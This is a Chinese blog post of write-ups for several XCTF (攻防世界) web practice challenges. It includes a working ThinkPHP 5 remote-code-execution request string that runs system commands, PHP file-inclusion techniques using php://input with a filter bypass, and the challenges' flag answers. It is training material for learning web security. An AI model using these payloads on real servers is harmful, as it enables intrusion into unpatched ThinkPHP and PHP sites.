---
title: 攻防世界Web高手进阶题
date: 2021-08-12 16:14:08
tags: [CTF,Web]
categories: CTF
---
# baby_web64
## 题目
&emsp;&emsp;难度系数： 1.0  
&emsp;&emsp;题目来源： 暂无  
&emsp;&emsp;题目描述：想想初始页面是哪个
## 解答
&emsp;&emsp;根据提示，直接访问index.php，发现被重定向回1.php，F12看请求，找到答案。

[![](https://pic.lufer.cc:8089/images/2021/08/12/image81e277c1fdc7463e.md.png)](https://pic.lufer.cc:8089/image/dcwo)

# Training-WWW-Robots
## 题目
&emsp;&emsp;难度系数： 1.0  
&emsp;&emsp;题目来源： 暂无  
&emsp;&emsp;题目描述：暂无  
## 解答
&emsp;&emsp;访问robots.php,得到网站目录。
```
User-agent: *
Disallow: /fl0g.php


User-agent: Yandex
Disallow: *
```
&emsp;&emsp;访问fl0g.php，得到答案`cyberpeace{67670cc4fa7382a7a38f780508caa43b}`。

# php_rce
## 题目
&emsp;&emsp;难度系数： 2.0  
&emsp;&emsp;题目来源： 暂无  
&emsp;&emsp;题目描述：暂无  
## 解答
&emsp;&emsp;根据题目描述，应该是远程代码执行漏洞，实验环境提示是ThinkPHPV5，百度搜索该版本的远程执行漏洞，得到代码如下：
`/index.php?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=whoami`

&emsp;&emsp;通过ls命令查看目录文件，发现没有，开始往上层找，最终再三层之后找到了flag文件：

`/index.php?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=ls%20../../../`

>bin boot dev etc flag home lib lib64 media mnt opt proc root run sbin srv sys tmp usr var var

&emsp;&emsp;cat一下flag文件得到答案：

`/index.php?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=cat%20../../../flag`

>flag{thinkphp5_rce} flag{thinkphp5_rce}

# Web_php_include
## 题目
&emsp;&emsp;难度系数： 2.0  
&emsp;&emsp;题目来源： XTCTF  
&emsp;&emsp;题目描述：暂无  
## 解答
&emsp;&emsp;根据题目描述，应该是PHP的文件包含漏洞。  
&emsp;&emsp;PHP的文件包含漏洞是指对于PHP中4个函数`include`、`include_once`、`require`、`require_once`，当利用这四个函数来包含文件时，不管文件是什么类型（图片、txt等等），都会直接作为php文件进行解析。  
&emsp;&emsp;观察题目环境，注意到是include了page页面，所以可以在对page的访问中构造攻击命令。
```php
<?php
show_source(__FILE__);
echo $_GET['hello'];
$page=$_GET['page'];
while (strstr($page, "php://")) {
    $page=str_replace("php://", "", $page);
}
include($page);
?>
```
&emsp;&emsp;然后PHP的文件包含漏洞攻击有两个常用命令：
1. php://input  
&emsp;&emsp;这个协议的利用方法是 将要执行的语法php代码写在post中提交，不用键与值的形式，只写代码即可。
2. php://filter  
&emsp;&emsp;设计用来过滤筛选文件，通过filter非php语法文件导致include失败，直接输出源码内容。

&emsp;&emsp;先采用input方法执行ls指令来查看目录下都有什么文件。  
&emsp;&emsp;由于代码中对php进行了替换，借助str_replace对大小写敏感来绕过替换。

![](https://pic.lufer.cc:8089/images/2021/08/12/image4c3fad9ca61d3e16.png)

&emsp;&emsp;发现目录下有疑似flag的文件，cat一下内容。

![](https://pic.lufer.cc:8089/images/2021/08/12/imaged1b72a13a09c1fcf.png)

&emsp;&emsp;得到答案`ctf{876a5fca-96c6-4cbd-9075-46f0c89475d2}`。